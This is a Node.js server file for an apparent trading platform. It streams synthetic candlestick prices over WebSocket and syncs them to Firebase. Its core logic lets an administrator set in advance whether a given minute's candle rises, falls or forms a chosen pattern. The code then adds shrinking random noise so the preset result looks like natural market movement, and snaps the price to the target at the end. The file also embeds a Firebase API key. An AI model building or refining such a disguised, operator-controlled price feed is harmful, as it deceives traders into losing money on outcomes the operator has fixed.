// --- START: server.js (Pre-calculated Target System) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 1000;
const TIMEFRAME = 60000;
const TICK_MS = 300;
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300;

const markets = {}; 
const adminOverrides = {}; // Stores the next action for each market

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// Listen for Admin Commands
db.ref('admin/market_overrides').on('value', (snapshot) => {
    const data = snapshot.val() || {};
    Object.keys(data).forEach(marketId => {
        adminOverrides[marketId] = data[marketId];
    });
});

// Pre-calculate the Target Candle based on Admin Command
function generateTargetCandle(timestamp, openPrice, overrideCmd, prevCandle) {
    const baseVol = openPrice * 0.00005;
    let isGreen = Math.random() > 0.5;
    let body = baseVol * (1 + Math.random() * 2);
    let upWick = baseVol * Math.random();
    let dnWick = baseVol * Math.random();

    if (overrideCmd) {
        const cmd = overrideCmd.type;

        if (cmd === 'UP') {
            isGreen = true;
            body = baseVol * (1.5 + Math.random());
        } 
        else if (cmd === 'DOWN') {
            isGreen = false;
            body = baseVol * (1.5 + Math.random());
        } 
        else if (cmd === 'OPPOSITE_BREAKOUT') {
            if (prevCandle) {
                const prevIsGreen = prevCandle.close >= prevCandle.open;
                const prevBody = Math.abs(prevCandle.close - prevCandle.open);
                isGreen = !prevIsGreen; // Opposite color
                body = prevBody * (1.2 + Math.random()); // Bigger body for breakout
                upWick = baseVol * 0.5;
                dnWick = baseVol * 0.5;
            } else {
                isGreen = Math.random() > 0.5;
                body = baseVol * 3;
            }
        } 
        else if (cmd.startsWith('PATTERN_')) {
            if (cmd === 'PATTERN_DOJI') {
                body = baseVol * 0.1; upWick = baseVol * 3; dnWick = baseVol * 3;
                isGreen = Math.random() > 0.5;
            } else if (cmd === 'PATTERN_MARUBOZU_GREEN') {
                isGreen = true; body = baseVol * 4; upWick = 0; dnWick = 0;
            } else if (cmd === 'PATTERN_MARUBOZU_RED') {
                isGreen = false; body = baseVol * 4; upWick = 0; dnWick = 0;
            } else if (cmd === 'PATTERN_HAMMER') {
                isGreen = true; body = baseVol * 1.5; upWick = 0; dnWick = baseVol * 3.5;
            } else if (cmd === 'PATTERN_SHOOTING_STAR') {
                isGreen = false; body = baseVol * 1.5; upWick = baseVol * 3.5; dnWick = 0;
            } else if (cmd === 'PATTERN_BIG_PUMP') {
                isGreen = true; body = baseVol * 6; upWick = baseVol; dnWick = baseVol;
            } else if (cmd === 'PATTERN_BIG_DUMP') {
                isGreen = false; body = baseVol * 6; upWick = baseVol; dnWick = baseVol;
            }
        }
    }

    const close = isGreen ? openPrice + body : openPrice - body;
    const high = Math.max(openPrice, close) + upWick;
    const low = Math.min(openPrice, close) - dnWick;

    return { timestamp, open: roundPrice(openPrice), close: roundPrice(close), high: roundPrice(high), low: roundPrice(low) };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;
    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateTargetCandle(nowPeriod - (i * TIMEFRAME), currentPrice, null, null);
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = {
        marketId,
        marketPath: path,
        history: candles,
        currentPrice: currentPrice,
        targetCandle: null
    };
}

function ensureTargetCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    
    // If a new minute has started, calculate the target for this minute
    if (!marketData.targetCandle || marketData.targetCandle.timestamp !== currentPeriod) {
        
        let overrideCmd = null;
        if (adminOverrides[marketData.marketId]) {
            const cmd = adminOverrides[marketData.marketId];
            // Check if command is for this specific minute
            if (currentPeriod >= cmd.targetTime && currentPeriod < cmd.targetTime + 60000) {
                overrideCmd = cmd;
                console.log(`[ADMIN EXECUTE] Market: ${marketData.marketId}, Cmd: ${cmd.type}`);
            }
        }

        const target = generateTargetCandle(currentPeriod, lastCandle.close, overrideCmd, lastCandle);
        marketData.targetCandle = target;
        
        // Push the initial state of the new candle
        const newCandle = { timestamp: currentPeriod, open: target.open, high: target.open, low: target.open, close: target.open };
        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        
        marketData.currentPrice = target.open;
    }
    return marketData.history[marketData.history.length - 1];
}

// 🔥 Smooth Interpolation (No forcing, just gliding to the target)
function updatePriceSmoothly(marketData, currentPeriod) {
    const target = marketData.targetCandle;
    if (!target) return;

    const timeElapsed = Date.now() - currentPeriod;
    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0); // 0.0 to 1.0

    // Where the price "should" be based on time
    const expectedPrice = target.open + ((target.close - target.open) * progress);
    
    // Add random noise that gets smaller as time runs out
    const noiseAllowed = (1 - progress) * (target.open * 0.0001);
    const noise = (Math.random() - 0.5) * noiseAllowed;

    let newPrice = expectedPrice + noise;

    // In the last 2 seconds, snap exactly to the target close to ensure accuracy
    if (progress > 0.97) {
        newPrice = target.close;
    }

    marketData.currentPrice = newPrice;

    // Update the live candle
    const liveCandle = marketData.history[marketData.history.length - 1];
    liveCandle.close = roundPrice(newPrice);
    
    // Expand high/low naturally based on the target wicks
    const expectedHigh = target.open + ((target.high - target.open) * progress);
    const expectedLow = target.open + ((target.low - target.open) * progress);
    
    liveCandle.high = roundPrice(Math.max(liveCandle.high, liveCandle.close, expectedHigh));
    liveCandle.low = roundPrice(Math.min(liveCandle.low, liveCandle.close, expectedLow));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach((marketId) => {
        const type = fbMarkets[marketId]?.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    const historyPayload = { type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) };
                    ws.send(JSON.stringify(historyPayload));
                }
            }
        } catch (_) {}
    });
});

app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

let lastSyncMinute = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentMinute = Math.floor(now / 60000);

    for (const marketId in markets) {
        const marketData = markets[marketId];
        ensureTargetCandle(marketData, currentPeriod);
        updatePriceSmoothly(marketData, currentPeriod);
        broadcastCandle(marketId, marketData.history[marketData.history.length - 1]);
    }

    if (currentMinute > lastSyncMinute) {
        lastSyncMinute = currentMinute;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            const lastC = m.history[m.history.length-1];
            if (lastC) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: lastC.close, timestamp: lastC.timestamp };
            }
        }
        db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('Interpolation Engine V1 Running'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));